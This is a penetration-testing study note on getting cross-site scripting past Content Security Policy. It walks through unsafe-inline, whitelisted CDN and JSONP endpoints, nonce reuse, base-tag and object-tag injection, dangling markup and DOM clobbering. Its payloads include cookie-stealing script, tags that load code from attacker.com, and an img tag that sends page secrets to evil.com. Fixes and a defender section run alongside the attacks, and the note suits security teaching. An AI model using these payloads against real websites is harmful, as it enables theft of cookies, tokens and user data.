---
tags: [vapt, xss, advanced]
difficulty: advanced
module: "07 - XSS"
topic: "07.15 CSP Bypass for XSS"
---

# 07.15 — CSP Bypass for XSS

## What is Content Security Policy?

CSP is an HTTP response header that tells browsers which resources are allowed to load and execute. It's the primary defense against XSS — even if an attacker injects a `<script>` tag, CSP prevents it from running.

```
CSP HEADER:
  Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com

MEANING:
  - default-src 'self':  All resources by default must come from same origin
  - script-src 'self':   Scripts only from same origin
  - https://cdn.example.com: Also allow scripts from this CDN

EFFECT:
  <script>alert(1)</script>         → BLOCKED (inline, no 'unsafe-inline')
  <script src="https://evil.com">   → BLOCKED (not in whitelist)
  <script src="https://cdn.example.com/evil.js"> → ALLOWED if cdn.example.com is trusted!
```

---

## CSP Directives Quick Reference

```
DIRECTIVE         CONTROLS
-----------       ---------
default-src       Fallback for all unspecified directives
script-src        JavaScript sources
style-src         CSS sources
img-src           Image sources
connect-src       fetch(), XHR, WebSocket connections
font-src          Font sources
frame-src         iframe sources
object-src        <object>, <embed>, <applet>
base-uri          <base> tag targets
form-action       Where forms can submit
frame-ancestors   Who can iframe this page (alternative to X-Frame-Options)
report-uri        Where CSP violations are reported
report-to         Where CSP violations are reported (newer)

VALUES:
  'self'          Same origin
  'none'          Nothing allowed
  'unsafe-inline' Allows inline scripts/styles (dangerous!)
  'unsafe-eval'   Allows eval() (dangerous!)
  'nonce-{value}' Allow specific inline scripts with matching nonce
  'sha256-{hash}' Allow specific inline scripts by hash
  https://domain  Allow resources from specific origin
  *               Wildcard (very dangerous!)
```

---

## Bypass 1: unsafe-inline Present

```
CSP (WEAK):
  Content-Security-Policy: script-src 'self' 'unsafe-inline'

BYPASS:
  <script>alert(document.cookie)</script>
  → 'unsafe-inline' allows inline scripts → XSS works normally!

NOTE: 'unsafe-inline' completely defeats CSP for script injection.
  Presence of 'unsafe-inline' = CSP doesn't protect against XSS.
```

---

## Bypass 2: Trusted Domain with XSS or Upload

```
CSP:
  script-src 'self' https://trusted-cdn.com

IF trusted-cdn.com HAS XSS:
  → Find XSS on trusted-cdn.com
  → Inject: <script src="https://trusted-cdn.com/...#alert(1)">
  → Or: <script src="https://trusted-cdn.com/xss-endpoint?callback=alert(1)">

IF trusted-cdn.com ALLOWS FILE UPLOAD:
  → Upload evil.js to trusted-cdn.com
  → Inject: <script src="https://trusted-cdn.com/uploads/evil.js">
  → CSP allows it! (domain is whitelisted)

COMMON BYPASSES ON CDN DOMAINS:
  *.google.com      → Google Sites, Google Apps Script
  *.googleapis.com  → Spreadsheets as JSON
  *.github.io       → Upload evil JS to GitHub Pages
  *.cloudfront.net  → Any CloudFront user can host files
  *.s3.amazonaws.com → Public S3 buckets
  ajax.googleapis.com → If any JSONP endpoints exist

CHECK BYPASS LIST:
  https://github.com/bhavesh-pardhi/CSP-Bypass
  → Comprehensive list of bypassable CDN domains
```

---

## Bypass 3: JSONP on Whitelisted Domain

```
CSP:
  script-src 'self' https://accounts.google.com

GOOGLE HAS A JSONP ENDPOINT:
  https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)
  
INJECT:
  <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
  → CSP allows (google.com whitelisted)
  → JSONP: alert(1337)({...}) → alert fires!

COMMON JSONP BYPASS TARGETS:
  *.google.com      → Multiple JSONP endpoints exist
  *.facebook.com    → Some FB endpoints
  *.twitter.com     → Some endpoints
  jquery.com        → cdn.jQuery deprecated JSONP but some hosts exist
```

---

## Bypass 4: Nonce or Hash Misuse

```
NONCE-BASED CSP:
  Content-Security-Policy: script-src 'nonce-abc123'
  
  <script nonce="abc123">legitimate code</script>
  → Only scripts with nonce="abc123" execute
  
BYPASS IF NONCE IS PREDICTABLE:
  → If nonce is sequential, timestamp-based, or reused
  → Guess the nonce → inject script with matching nonce!

BYPASS IF NONCE IS REFLECTED IN PAGE:
  → If the nonce appears in the page HTML (for any reason)
  → Attacker can read the nonce → use it in injected script!
  
EXAMPLE:
  CSP: script-src 'nonce-ABCDEF'
  Page source: <script nonce="ABCDEF">
  → Attacker injects: <script nonce="ABCDEF">alert(1)</script>
  → CSP allows (nonce matches)!

HASH-BASED CSP:
  Content-Security-Policy: script-src 'sha256-abc123hash'
  → Only scripts whose SHA-256 hash matches execute
  → Hard to bypass unless you can inject arbitrary content into a whitelisted script
```

---

## Bypass 5: base-uri Not Set

```
CSP (MISSING base-uri):
  Content-Security-Policy: script-src 'nonce-abc123'
  (no base-uri directive)

ATTACK:
  If you can inject a <base> tag:
  <base href="https://attacker.com/">
  
  ALL relative script loads now go to attacker.com!
  
  Page has: <script src="/app.js" nonce="abc123">
  → Actually loads: https://attacker.com/app.js
  → Nonce still matches → CSP allows it!
  → Attacker controls content of app.js!

FIX: Add base-uri 'self' or base-uri 'none' to CSP
```

---

## Bypass 6: object-src Not Set

```
CSP:
  script-src 'self'
  (no object-src or default-src directive → defaults to * !)

ATTACK:
  <object data="data:text/html,<script>alert(1)</script>">
  OR:
  <object data="https://evil.com/evil.swf"> ← Flash (dead)
  <embed src="https://evil.com/evil.swf">
  
  If object-src isn't explicitly set:
  → Browser allows any object source → XSS via data: URI!

FIX: Set object-src 'none' explicitly
```

---

## Bypass 7: Dangling Markup (CSP-Bypass without JS)

```
SCENARIO:
  CSP blocks all scripts
  But: you can inject HTML (not JS)
  
ATTACK (Data Exfiltration without JS):
  1. Inject: <img src="https://evil.com/?
  2. The unclosed img src attribute "swallows" subsequent HTML!
  3. The HTML up to the next quote is sent to attacker!
  
EXAMPLE:
  Injected: <img src="https://evil.com/steal?data=
  Page becomes:
  <img src="https://evil.com/steal?data=
  SECRET_DATA_HERE...
  more_html_here" >
  ← Everything between is sent as query param!

WHY IT WORKS:
  → No JavaScript involved → script-src CSP irrelevant
  → img-src might allow external images
  → CSRF tokens, session values, secrets can be exfiltrated!

REQUIRES:
  → img-src allows external URLs (or default-src *)
  → Vulnerable page has sensitive data after injection point
```

---

## Bypass 8: DOM Clobbering

```
SCENARIO:
  CSP allows inline scripts (unsafe-inline)
  OR: app uses a nonce but has a trusted script that can be manipulated

DOM CLOBBERING:
  Inject: <form id="token"><input name="value" value="attacker"></form>
  → window.token becomes the form element!
  → If code does: var tok = token.value → reads attacker's value!
  
WHEN USEFUL:
  → bypass security checks that use DOM properties
  → Override variables checked in CSP-safe scripts
  → Not direct XSS but can be chained for privilege escalation
```

---

## Evaluating CSP Strength

```bash
# CHECK CSP HEADER:
curl -I https://target.com | grep -i "content-security-policy"

# USE GOOGLE CSP EVALUATOR:
# https://csp-evaluator.withgoogle.com/
# Paste CSP → shows weaknesses automatically

# MANUAL CHECKS FOR WEAKNESS:
# 1. Is 'unsafe-inline' present? → BYPASSED
# 2. Is 'unsafe-eval' present? → eval() works → harder to bypass but risky
# 3. Are wildcard domains (*) present? → BYPASSED
# 4. Are CDNs whitelisted that have JSONP? → check bypass list
# 5. Is object-src set? → if not → data: object XSS
# 6. Is base-uri set? → if not → base tag injection
# 7. Is nonce reused across requests? → predictable nonce attack
```

---

## CSP Reporting (For Defenders)

```
CSP REPORT-ONLY MODE:
  Content-Security-Policy-Report-Only: script-src 'self'; report-uri /csp-report

  → Does NOT block resources
  → Reports violations to /csp-report
  → Use to test CSP before enforcing it!

REPORT FORMAT:
  POST /csp-report
  {
    "csp-report": {
      "document-uri": "https://target.com/page",
      "violated-directive": "script-src 'self'",
      "blocked-uri": "https://evil.com/evil.js"
    }
  }
  
WHY USEFUL FOR ATTACKERS:
  → report-uri endpoint reveals attempted XSS activity
  → Report-Only mode means XSS WORKS — just reported, not blocked!
  → If target uses report-uri, you can find their CSP policy
```

---

## Related Notes
- [[14 - XSS Filter Bypass Techniques]] — filter-level bypass
- [[Module 15 - WAF Bypass]] — WAF bypass techniques
- [[02 - Reflected XSS]] — XSS fundamentals
- [[34 - Content-Security-Policy header]] — CSP header deep dive
- [[04 - DOM-Based XSS]] — DOM clobbering context
